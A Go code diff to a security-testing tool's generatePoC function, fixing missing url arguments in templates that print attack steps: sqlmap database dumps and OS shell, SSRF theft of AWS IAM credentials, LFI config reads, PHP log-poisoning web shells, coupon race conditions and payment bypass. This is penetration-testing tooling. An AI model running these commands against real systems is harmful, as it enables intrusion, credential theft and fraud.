@@ -1386,7 +1386,7 @@ func generatePoC(bug Bug) string {
 		sb.WriteString("# Step 3: Dump database\n")
 		sb.WriteString(fmt.Sprintf("sqlmap -u '%s' --batch --dump-all --threads 5\n\n", url))
 		sb.WriteString("# Step 4: Try OS shell (if MySQL + FILE privilege)\n")
-		sb.WriteString(fmt.Sprintf("sqlmap -u '%s' --batch --os-shell\n"))
+		sb.WriteString(fmt.Sprintf("sqlmap -u '%s' --batch --os-shell\n", url))
 		sb.WriteString("```\n")
 
 	case "CWE-918": // SSRF
@@ -1399,7 +1399,7 @@ func generatePoC(bug Bug) string {
 		sb.WriteString("# Start interactsh: interactsh-client\n")
 		sb.WriteString(fmt.Sprintf("curl -s '%s?url=http://YOUR_INTERACTSH_URL'\n\n", url))
 		sb.WriteString("# Step 4: If AWS metadata accessible, get IAM credentials\n")
-		sb.WriteString(fmt.Sprintf("curl -s '%s?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME'\n"))
+		sb.WriteString(fmt.Sprintf("curl -s '%s?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME'\n", url))
 		sb.WriteString("```\n")
 
 	case "CWE-22": // LFI
@@ -1413,7 +1413,7 @@ func generatePoC(bug Bug) string {
 		sb.WriteString(fmt.Sprintf("curl -s '%s?file=../../../var/www/html/config.php'\n\n", url))
 		sb.WriteString("# Step 4: Try log poisoning for RCE\n")
 		sb.WriteString(fmt.Sprintf("curl -s -H 'User-Agent: <?php system($_GET[cmd]); ?>' '%s'\n", url))
-		sb.WriteString(fmt.Sprintf("curl -s '%s?file=../../../var/log/apache2/access.log&cmd=id'\n"))
+		sb.WriteString(fmt.Sprintf("curl -s '%s?file=../../../var/log/apache2/access.log&cmd=id'\n", url))
 		sb.WriteString("```\n")
 
 	case "CWE-78": // RCE
@@ -1440,7 +1440,7 @@ func generatePoC(bug Bug) string {
 		sb.WriteString("# Step 4: Try UUID prediction (if UUIDs used)\n")
 		sb.WriteString("# Use uuid-tool to predict sequential UUIDs\n")
 		sb.WriteString("# Step 5: Try object reference in headers\n")
-		sb.WriteString(fmt.Sprintf("curl -s -H 'X-User-ID: 1' -H 'X-Account-ID: 1' '%s'\n"))
+		sb.WriteString(fmt.Sprintf("curl -s -H 'X-User-ID: 1' -H 'X-Account-ID: 1' '%s'\n", url))
 		sb.WriteString("```\n")
 
 	case "CWE-840": // Business Logic
@@ -1451,8 +1451,8 @@ func generatePoC(bug Bug) string {
 		sb.WriteString("# Use Turbo Intruder or:\n")
 		sb.WriteString(fmt.Sprintf("for i in $(seq 1 20); do curl -s -X POST '%s' -d 'coupon=SAVE50' & done; wait\n\n", url))
 		sb.WriteString("# Step 3: Test workflow bypass\n")
-		sb.WriteString(fmt.Sprintf("# Skip payment step by directly calling order confirmation endpoint\n"))
-		sb.WriteString(fmt.Sprintf("curl -s -X POST '%s/confirm' -H 'Authorization: Bearer TOKEN' -d '{\"order_id\": 123}'\n"))
+		sb.WriteString("# Skip payment step by directly calling order confirmation endpoint\n")
+		sb.WriteString(fmt.Sprintf("curl -s -X POST '%s/confirm' -H 'Authorization: Bearer TOKEN' -d '{\"order_id\": 123}'\n", url))
 		sb.WriteString("```\n")
 
 	default:
